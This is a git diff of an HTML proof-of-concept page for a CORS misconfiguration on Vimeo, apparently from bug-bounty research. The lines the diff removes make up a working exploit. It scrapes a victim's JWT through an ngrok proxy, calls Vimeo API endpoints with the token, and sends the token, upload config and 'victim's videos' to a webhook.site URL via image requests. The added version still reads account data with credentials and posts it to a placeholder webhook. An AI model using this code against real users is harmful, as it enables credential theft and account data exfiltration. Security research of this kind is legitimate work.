@@ -1,67 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Vimeo CORS PoC – Auto JWT Extraction</title>
+  <meta charset="UTF-8">
+  <title>Vimeo CORS Test</title>
 </head>
 <body>
-  <h1>Vimeo CORS Misconfiguration PoC</h1>
-  <pre id="output">Loading...</pre>
-
+  <h1>Testing Vimeo CORS</h1>
   <script>
-    const exfil = "https://webhook.site/5749a8e8-dd44-4f2d-a5b6-229b51be49f1";
+    fetch("https://api.vimeo.com/me", {
+      credentials: "include"
+    })
+      .then(res => res.json())
+      .then(data => {
+        console.log("My Vimeo Data:", data);
 
-    // Step 1: Fetch Vimeo homepage via local proxy
-    fetch("https://1f13b5db8cf4.ngrok-free.app/fetch?url=https://vimeo.com/manage/videos/1108716779")
-      .then(response => response.text())
-      .then(html => {
-        // Step 2: Extract JWT using regex
-        const jwtMatch = html.match(/"jwt"\s*:\s*"([^"]+)"/);
-        if (!jwtMatch) throw new Error("JWT token not found in Vimeo homepage");
-
-        const jwt = jwtMatch[1];
-        document.getElementById("output").innerText = "Extracted JWT:\n" + jwt;
-
-        // Exfil the JWT via image (bypass CORS)
-        const jwtImg = new Image();
-        jwtImg.src = exfil + "?jwt=" + encodeURIComponent(jwt);
-
-        // Step 3: Use the JWT to call Vimeo API (real endpoint)
-        return fetch("https://api.vimeo.com/upload/config", {
-          headers: {
-            "Authorization": "jwt " + jwt
-          }
+        // Optional: Send to webhook (your own only)
+        fetch("https://webhook.site/your-webhook-id", {
+          method: "POST",
+          body: JSON.stringify(data),
+          headers: { "Content-Type": "application/json" }
         });
-      })
-      .then(r => r.json())
-      .then(configData => {
-        document.getElementById("output").innerText += "\n\n/upload/config:\n" + JSON.stringify(configData, null, 2);
-
-        // Exfil the config data via image (also bypass CORS)
-        const configImg = new Image();
-        configImg.src = exfil + "?stolen_config=" + encodeURIComponent(JSON.stringify(configData));
-
-        // Optionally extract a secondary JWT and make more calls
-        const secondJwt = configData?.api?.jwt;
-        if (secondJwt) {
-          return fetch("https://api.vimeo.com/users/244943635/videos", {
-            headers: {
-              "Authorization": "jwt " + secondJwt
-            }
-          }).then(r => r.json());
-        }
-      })
-      .then(videosData => {
-        if (!videosData) return;
-
-        document.getElementById("output").innerText += "\n\nVictim's Videos:\n" + JSON.stringify(videosData, null, 2);
-
-        // Exfil the videos via image
-        const videosImg = new Image();
-        videosImg.src = exfil + "?victim_videos=" + encodeURIComponent(JSON.stringify(videosData));
-      })
-      .catch(err => {
-        document.getElementById("output").innerText = "Error: " + err.message;
-        console.error(err);
       });
   </script>
 </body>
